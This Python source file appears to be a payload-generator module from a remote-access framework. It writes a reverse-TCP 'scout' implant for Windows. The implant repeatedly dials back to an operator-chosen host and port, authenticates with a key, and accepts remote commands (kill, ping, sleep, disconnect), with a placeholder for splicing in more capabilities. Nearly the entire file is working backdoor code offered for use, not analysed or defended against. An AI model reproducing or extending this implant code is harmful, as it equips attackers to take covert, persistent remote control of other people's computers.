# WEB + COM
# done
import library.modules.config as config
import library.modules.safe_open as safe_open
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(option):
    if option == 'generate':
        host = config.scout_values['Host'][0]
        port = config.scout_values['Port'][0]
        key = config.key
        timeout = config.scout_values['Timeout'][0]
        filepath = config.scout_values['Path'][0]
        config.import_statements.append('import socket')
        config.import_statements.append('from os import _exit')
        config.import_statements.append('from time import sleep')
        config.import_statements.append('import pickle')
        with safe_open.main(filepath, 'w') as f:
            if ',' in host:
                host = str(host.replace(' ','').split(','))
                f.write('''
def recv_all(sock):
    x = 0  ########## REMOVE WHEN IMPLMENTING ##########
    sock.settimeout(None)
    try:  # encoded bytes that can be decoded to UTF8
        data = sock.recv(1000000)
        processed_data = data.decode()  # Only test for encoding in the first part just so we can take out length bytes if we can .decode() the first segment it doesnt guarantee future segments can be .decoded()
        target_length = int(processed_data.split("|", 1)[
                                0])  # split by seperator to get leading bytes which tell us the length of message
        data = data[len(str(target_length)) + 1:]  # usable data
    except UnicodeDecodeError:  # encoded bytes that cannot be safely converted to UTF8
        target_length = int(data.decode(encoding='utf-8', errors='ignore').split("|", 1)[
                                0])  # split by seperator to get leading bytes which tell us the length of message
        data = data[len(str(target_length)) + 1:]  # usable data

    received_data_length = len(
        data)  # actual received length of usable data we got excluding length of size bytes and seperator
    if received_data_length >= target_length:  # x|data where value x denotes only length of data we take away the bytes that were unaccounted for namely length of x + 1 (the seperator)
        try:
            return data.decode()  # data can be decoded into utf-8
        except UnicodeDecodeError:
            return data  # data cant be decoded indicative of a raw file of sorts

    sock.settimeout(
        3)  # NOTE we disregard byte encoding when obtaining data we only decode at the very end when we have all data we cannot decode and assume for each individual segment
    while received_data_length < target_length:  # we now no longer have to account for the free bytes used at the front but must account for the used bytes should they have been insufficient
        try:
            x += 1  ########## REMOVE THis STATEMENT WHEN ACUTALLY IMPLEMENTING ##########
            #print(str(x) + " parts out of " + str(
            #    target_length / 1000000) + " received, this is a rough progress bar")  ########### REMOVE OR NOT LOL YOU CAN KEEP THE PROGRESS BAR MAYBE TO SHOW USERS ##########
            tmp_data = sock.recv(1000000)
            if not tmp_data:
                raise socket.error
            data += tmp_data
            received_data_length += 1000000
        except (socket.error, socket.timeout):  # in case of network hiccup/ network error disconnect we bail out
            break
    try:
        return data.decode()  # data can be decoded into utf-8
    except UnicodeDecodeError:
        return data  # data cant be decoded indicative of a raw file of sorts

def main_send(data, sock):
    try: # normal utf-8 message that needs to be byte encoded
        sock.sendall((str(len(data)) + "|" + data).encode())
    except TypeError: # raw bytes that are technically alr encoded
        sock.sendall(str(len(data)).encode() + b"|" + data)
host_list = variable_host
while True:
    connected = False
    while True:
        for i in host_list:
            try:
                s = socket.socket()
                s.settimeout(variable_timeout)
                s.connect((i,variable_port))
                s.sendall('variable_key'.encode())
                connected = True
                break
            except (socket.timeout,socket.error):
                continue
        if connected:
            break
    while True:
        try:
            data = recv_all(s)
            interface = data.split(' ')[0]
            if interface == "g":
                interface = "GUI"
            elif interface == "c":
                interface = "CUI"
            data = data.split(' ')[1:]
            command = ""
            for command_string in data:
                command = command + command_string + " "
            data = command.strip()
            command = data.split(" ")[0]
            if command == 'kill':
                main_send('[*]Scout is killing itself...', s)
                _exit(1)
            elif command in ('help','?'):
                if interface == "GUI":
                    main_send(pickle.dumps(comp_list), s)
                elif interface == "CUI":
                    main_send(help_menu, s)
            elif command == 'ping':
                main_send('[+]Scout is alive', s)
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                main_send('[*]Scout is sleeping...', s)
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                main_send('[*]Scout is disconnecting itself...', s)
                sleep(3)
                break#Statements#
            else:
                main_send('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)', s)
        except (socket.error,socket.timeout) as e:
            try:
                if type(e) not in (ConnectionResetError,socket.timeout):
                    raise e
                s.close()
                break
            except IndexError:
                main_send('[-]Please supply valid arguments for the command you are running', s)
            except Exception as e:
                main_send(('[!]Error in scout : ' + str(e)), s)
        except IndexError:
            main_send('[-]Please supply valid arguments for the command you are running', s)
        except Exception as e:
            main_send(('[!]Error in scout : ' + str(e)), s)
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
            'variable_key', key))
            else:
                f.write('''
def recv_all(sock):
    x = 0  ########## REMOVE WHEN IMPLMENTING ##########
    sock.settimeout(None)
    try:  # encoded bytes that can be decoded to UTF8
        data = sock.recv(1000000)
        processed_data = data.decode()  # Only test for encoding in the first part just so we can take out length bytes if we can .decode() the first segment it doesnt guarantee future segments can be .decoded()
        target_length = int(processed_data.split("|", 1)[
                                0])  # split by seperator to get leading bytes which tell us the length of message
        data = data[len(str(target_length)) + 1:]  # usable data
    except UnicodeDecodeError:  # encoded bytes that cannot be safely converted to UTF8
        target_length = int(data.decode(encoding='utf-8', errors='ignore').split("|", 1)[
                                0])  # split by seperator to get leading bytes which tell us the length of message
        data = data[len(str(target_length)) + 1:]  # usable data

    received_data_length = len(
        data)  # actual received length of usable data we got excluding length of size bytes and seperator
    if received_data_length >= target_length:  # x|data where value x denotes only length of data we take away the bytes that were unaccounted for namely length of x + 1 (the seperator)
        try:
            return data.decode()  # data can be decoded into utf-8
        except UnicodeDecodeError:
            return data  # data cant be decoded indicative of a raw file of sorts

    sock.settimeout(
        3)  # NOTE we disregard byte encoding when obtaining data we only decode at the very end when we have all data we cannot decode and assume for each individual segment
    while received_data_length < target_length:  # we now no longer have to account for the free bytes used at the front but must account for the used bytes should they have been insufficient
        try:
            x += 1  ########## REMOVE THis STATEMENT WHEN ACUTALLY IMPLEMENTING ##########
            print(str(x) + " parts out of " + str(
                target_length / 1000000) + " received, this is a rough progress bar")  ########### REMOVE OR NOT LOL YOU CAN KEEP THE PROGRESS BAR MAYBE TO SHOW USERS ##########
            tmp_data = sock.recv(1000000)
            if not tmp_data:
                raise socket.error
            data += tmp_data
            received_data_length += 1000000
        except (socket.error, socket.timeout):  # in case of network hiccup/ network error disconnect we bail out
            break
    try:
        return data.decode()  # data can be decoded into utf-8
    except UnicodeDecodeError:
        return data  # data cant be decoded indicative of a raw file of sorts

def main_send(data, sock):
    try: # normal utf-8 message that needs to be byte encoded
        sock.sendall((str(len(data)) + "|" + data).encode())
    except TypeError: # raw bytes that are technically alr encoded
        sock.sendall(str(len(data)).encode() + b"|" + data)

while True:
    while True:
        try:
            s = socket.socket()
            s.settimeout(variable_timeout)
            s.connect(('variable_host',variable_port))
            s.sendall('variable_key'.encode())
            break
        except (socket.timeout,socket.error):
            continue
    while True:
        try:
            data = recv_all(s)
            interface = data.split(' ')[0]
            if interface == "g":
                interface = "GUI"
            elif interface == "c":
                interface = "CUI"
            data = data.split(' ')[1:]
            command = ""
            for command_string in data:
                command = command + command_string + " "
            data = command.strip()
            command = data.split(" ")[0]
            if command == 'kill':
                main_send('[*]Scout is killing itself...', s)
                _exit(1)
            elif command in ('help','?'):
                if interface == "GUI":
                    main_send(pickle.dumps(comp_list), s)
                elif interface == "CUI":
                    main_send(help_menu, s)
            elif command == 'ping':
                main_send('[+]Scout is alive', s)
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                main_send('[*]Scout is sleeping...', s)
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                main_send('[*]Scout is disconnecting itself...', s)
                sleep(3)
                break#Statements#
            else:
                main_send('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)', s)
        except (socket.error,socket.timeout) as e:
            try:
                if type(e) not in (ConnectionResetError,socket.timeout):
                    raise e
                s.close()
                break
            except IndexError:
                main_send('[-]Please supply valid arguments for the command you are running', s)
            except Exception as e:
                main_send(('[!]Error in scout : ' + str(e)), s)
        except IndexError:
            main_send('[-]Please supply valid arguments for the command you are running', s)
        except Exception as e:
            main_send(('[!]Error in scout : ' + str(e)), s)
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
            'variable_key', key))
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Reverse TCP Base component",
                "OS": "Windows",
                "Required Modules": "socket, time",
                "Commands": "kill, ping, sleep <time>, disconnect",
                "Description": "The base component of the scout, it allows it to connect back to the server and supports connection status commands",
                "Connection Type": "Reverse"}
        elif interface == "CUI":
            print('\nName             : Reverse TCP Base component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : socket, time' \
                  '\nCommands         : kill, ping, sleep <time>, disconnect' \
                  '\nDescription      : The base component of the scout, it allows it to connect back to the server and supports connection status commands' \
                  '\nConnection type  : Reverse\n')

